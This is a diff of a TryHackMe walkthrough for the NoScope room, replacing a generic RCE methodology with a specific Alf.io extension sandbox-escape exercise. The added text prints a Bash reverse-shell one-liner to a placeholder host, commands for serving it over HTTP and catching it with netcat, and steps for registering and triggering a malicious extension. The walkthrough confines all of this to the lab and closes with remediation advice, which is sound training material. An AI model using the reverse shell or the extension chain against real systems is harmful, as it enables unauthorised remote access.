@@ -1,55 +1,137 @@
-# No Scope: Finding RCE — TryHackMe Walkthrough
+# NoScope: Finding RCE — TryHackMe Walkthrough
 
-Room: https://tryhackme.com/room/noscope
+Official room: https://tryhackme.com/room/noscoperce
 
-Remote code execution (RCE) means an attacker can cause code or commands to run on a remote system. Finding it requires evidence that an input reaches an execution context in an unsafe way. A strange error, reflected string, or open port alone does not establish RCE.
+## Room Overview & Information
 
-## 1. Establish scope and collect baseline data
+**Category:** Web exploitation / AI-assisted penetration testing  
+**Difficulty:** Challenge-based  
+**Vulnerability:** CVE-2026-35482, a sandbox escape in an Alf.io extension script environment.  
+**Goal:** Observe NoScope's automated assessment, understand the vulnerable JavaScript sandbox, and reproduce the authorised lab's extension-triggered remote code execution.
 
-Start the room's machine and record its assigned address. Run a service scan and save the result:
+This room uses an Alf.io event-management application with an extension system. The vulnerable version injects a Java `Class` object called `returnClass` into the JavaScript scope. Because the sandbox relies on a blocklist that looks for dangerous class names in the script text, using the injected object to resolve a class dynamically bypasses the filter. The resulting Java reflection path can reach `Runtime.exec()`.
 
-    nmap -sC -sV -oN noscope-nmap.txt TARGET_IP
+Only run these steps against the machine deployed for this room. The payloads below use placeholders for the AttackBox address and must not be pointed at a real service.
 
-Use the actual address from the lab. Identify the exposed services and inspect the web application if HTTP or HTTPS is available. Keep the testing limited to the assigned target.
+## Task 1: Introduction and vulnerability model
 
-## 2. Map the application attack surface
+Alf.io is a Java/Spring Boot event-management platform. Its extension mechanism allows scripts to run when application events occur. The intended sandbox restricts access to the underlying JVM. In the vulnerable design, however, the application exposes `returnClass`, a raw Java class object.
 
-Inspect pages, parameters, forms, file handling, API endpoints, and error responses. Record which inputs the server accepts and what happens to them. If a directory scan is required, use a wordlist available in the lab and manually review the results.
+The critical trust error is that the blocklist assumes dangerous functionality cannot be reached if its name is not present literally in the script. Dynamic class lookup defeats that assumption: the script can call `returnClass.forName('java.lang.Runtime')` without spelling the blocked class name in the expected form.
 
-Prioritise features that process user-controlled values through interpreters or external utilities, but do not assume that any particular parameter is vulnerable before testing it.
+This is a sandbox escape leading to OS command execution. A sandbox must constrain capabilities, not merely block a few strings.
 
-## 3. Distinguish reflection from execution
+## Task 2: Vulnerability Hunting with NoScope
 
-A server may return user input in the response without executing it. RCE requires stronger evidence, such as a controlled benign expression being evaluated by the server or a harmless command producing a result that could only come from the target execution context.
+Start the lab machine. When it has finished booting, open the NoScope interface provided by the room and test the assigned `MACHINE_IP`. Fill in the application's basic details and start the automated assessment.
 
-Use the proof method required by the room. Do not run destructive commands, access unrelated secrets, or attempt to persist on the host. If the task provides an interactive shell, verify the host and user identity before continuing.
+Observe the activity log as the tool maps the application, explores the extension surface, and validates candidate findings. Treat the report as useful evidence, but understand what was actually tested and what proof supports the conclusion.
 
-## 4. Analyse the input-to-execution path
+### Question 1: “What sandboxing engine did NoScope identify as the one in use?”
 
-Trace the input through validation, decoding, application logic, and any interpreter or subprocess. Identify whether the issue comes from command concatenation, unsafe deserialisation, a template engine, a vulnerable component, or another mechanism. The correct explanation depends on evidence from the target.
+Review the validated finding or report produced by the room's NoScope assessment. The scenario identifies the JavaScript sandbox as **Mozilla Rhino**. Submit the engine name as requested.
 
-Document:
-- The affected endpoint or feature.
-- The user-controlled input.
-- The processing step that causes unsafe interpretation.
-- The minimal proof of execution.
-- The privileges of the resulting process.
-- Any assumptions or limitations.
+### Question 2: “What was the flag value NoScope retrieved out of the flag.txt file during its engagement?”
 
-## 5. Verify the impact and stop at the agreed boundary
+Open the report and locate the flag value that NoScope retrieved from the lab's `flag.txt`. Submit the exact value shown by the current room. This public write-up does not publish the flag; use `flag{hidden}` as a redaction placeholder.
 
-RCE can range from execution as a low-privilege service account to broader compromise. Verify the actual context and avoid overstating the impact. A command running as the web-server user does not mean root access, and a successful proof does not justify exploring unrelated systems.
+## Task 3: Weaponizing the CVE
 
-## 6. Remediation
+The room states that the target runs Alf.io `2.0-M5-2509-1`, is vulnerable to CVE-2026-35482, and provides administrator credentials for the lab. An event has already been configured. The objective is to register an extension that executes a reverse-shell script when the specified event is triggered.
 
-Fix the unsafe input-to-execution path. Prefer safe library APIs over shell commands, use parameterised interfaces, apply strict input validation, patch affected components, and run the service with least privilege. Add regression tests that demonstrate the original input is handled as data rather than code.
+### Step 1: Prepare the callback on the AttackBox
 
-Logging should capture security-relevant events while avoiding unnecessary storage of passwords, tokens, or private data. Detection can look for unexpected child processes, unusual request patterns, and web-server processes invoking shells.
+Start the AttackBox and determine its address that the lab machine can reach. Use that address in place of `CONNECTION_IP`.
 
-## 7. Working through the room
+Create a file named `rev.sh`:
 
-Follow the active task and use the target's actual response to validate each hypothesis. If a test does not behave as expected, check the endpoint, encoding, request method, and lab state before trying alternatives. Do not publish a payload as confirmed unless it was tested in the room.
+```bash
+#!/bin/bash
+bash -i >& /dev/tcp/CONNECTION_IP/4444 0>&1 &
+```
 
-## What I took from this room
+The script opens a Bash TCP connection back to the listener. The callback IP must be reachable from the target; do not use a loopback address unless both processes are on the same host.
 
-RCE is a claim that requires proof. The reliable approach is to map the attack surface, trace how input is processed, demonstrate the smallest safe execution result, and explain both the real impact and the underlying fix.
+Serve the file over HTTP:
+
+```bash
+python3 -m http.server 80
+```
+
+This starts a simple file server in the current directory. Keep it running so the target can download `rev.sh`.
+
+In a second terminal, start a listener:
+
+```bash
+nc -lvnp 4444
+```
+
+- `-l` listens for an incoming connection.
+- `-v` enables verbose output.
+- `-n` disables reverse DNS lookup.
+- `-p 4444` selects the local listening port.
+
+Use only the lab's assigned AttackBox and target.
+
+### Step 2: Understand the extension payload
+
+The exploit uses the injected `returnClass` object to load Java classes by name. The room's intended chain is:
+
+1. Resolve `java.lang.Runtime` dynamically.
+2. Resolve `java.lang.String` as the argument type.
+3. Obtain the runtime object through reflection.
+4. Invoke `Runtime.exec()` to download the callback script.
+5. Change the downloaded script's permissions.
+6. Execute the script.
+7. Observe the callback at the listener.
+
+The important technical point is that `Runtime.exec(String)` does not invoke a shell to expand arbitrary shell metacharacters. Separate commands are therefore invoked explicitly, as the room's example does.
+
+Use the exact JavaScript payload and event metadata supplied in the official task. Keep the callback address as a placeholder until you substitute the AttackBox address for your own instance. Do not run the payload against any system other than the deployed lab.
+
+### Step 3: Register the extension
+
+1. Open `http://MACHINE_IP/admin` in the lab browser.
+2. Sign in using the administrator credentials provided by the room.
+3. Navigate to **Extension** and choose the option to add a new extension.
+4. Enter an extension path such as `System/rev`, as the room demonstrates.
+5. Paste the task's extension script with the correct callback address.
+6. Save the extension and verify that the application accepts it.
+
+The script's metadata registers it for the event `EVENT_STATUS_CHANGE`. This event binding is important because saving the extension alone does not necessarily execute it.
+
+### Step 4: Trigger the extension
+
+The room has an event prepared for the exercise. Navigate to **Events**, choose **Load expired events**, locate the supplied event, and select **Publish now**. This generates the event that invokes the registered extension.
+
+Watch the Netcat listener. If the callback arrives, verify the shell identity and host as permitted by the task. A connection to the listener is evidence that the callback executed, but it is still necessary to verify the session and avoid claiming privileges that have not been demonstrated.
+
+If the callback does not arrive:
+- Confirm the HTTP server is serving the directory containing `rev.sh`.
+- Confirm the payload uses the correct AttackBox address.
+- Confirm port 80 and port 4444 are reachable in the lab network.
+- Confirm the extension was saved and is bound to the correct event.
+- Trigger the event again as the room describes.
+
+The room notes that the extension can be triggered again by hiding the event: edit the event date to a future date, save it, then select **Actions → hide from list**. Use this only to repeat the authorised lab exercise.
+
+### Question: “On what event is the exploit payload triggered?”
+
+Answer: `EVENT_STATUS_CHANGE`.
+
+## Phase 4: Evidence, impact, and remediation
+
+The exploit demonstrates that a blocklist-based sandbox can fail when it exposes powerful objects and allows dynamic reflection. The root cause is excessive capability exposure and an incomplete security boundary, not merely a missing blocked string.
+
+Recommended controls:
+- Do not expose raw Java reflection or unrestricted class-loading objects to untrusted scripts.
+- Use a capability-based sandbox that denies dangerous operations by construction.
+- Run extension code in a separate process or container with minimal privileges and strict network/file access.
+- Restrict and authenticate extension management.
+- Validate extension provenance and audit changes.
+- Monitor unexpected child processes and outbound connections.
+- Patch to a version that fixes the vulnerable binding and sandbox escape.
+
+## Key takeaways
+
+NoScope's finding demonstrates a JavaScript-to-JVM sandbox escape through an exposed class object. The workflow moves from automated identification to a manual reproduction in the lab, registers an event-driven extension, and verifies the callback. The security lesson is to constrain capabilities instead of relying on string-based blocklists.
